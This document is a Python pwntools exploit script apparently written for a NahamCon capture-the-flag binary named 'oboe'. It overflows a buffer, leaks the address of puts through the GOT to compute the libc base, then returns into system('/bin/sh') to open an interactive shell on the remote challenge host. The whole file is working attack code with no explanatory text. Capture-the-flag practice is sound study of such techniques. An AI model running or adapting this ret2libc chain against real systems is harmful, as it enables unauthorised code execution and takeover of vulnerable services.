#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
    
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./oboe')
		if debug:
			gdb.attach(io, gdbscript='''
            b* build+172
            b* build+240
            b* build+307
            c
			''')
		else:
			raw_input('DEBUG')
	else:
		io = remote('challenge.nahamcon.com',30538)

	return io

io = conn()

elf = ELF('./oboe')
#libc = ELF('libc6-i386_2.27-3ubuntu1.5_amd64.so')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

pop_ebx_esi_edi_ebp = 0x080487e8
pop_ebx_ebp = 0x0804858b
ret = 0x0804819b

main = 0x80486f5
build = 0x804858e

payload = b'A'*64 
io.sendline(payload)
payload = b'B'*64
io.sendline(payload)
payload = b'C'*4 + p32(elf.plt['puts']) + p32(main) + p32(elf.got['puts']) + (34-16)*b'B'
io.sendline(payload)
io.recvuntil(b'Result:')
io.recvline()
io.recvline()

puts = u32(io.recv(4))
log.info("puts : " + hex(puts))
libc_base = puts - libc.sym['puts']
log.info("libc_leak : " + hex(libc_base))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
exit = libc_base + libc.sym['exit']

payload = b'A'*64 
io.sendline(payload)
payload = b'B'*64
io.sendline(payload)
payload = b'C'*4 +  p32(system) + p32(exit) + p32(bin_sh) + (34-16)*b'B'
io.sendline(payload)

io.interactive()

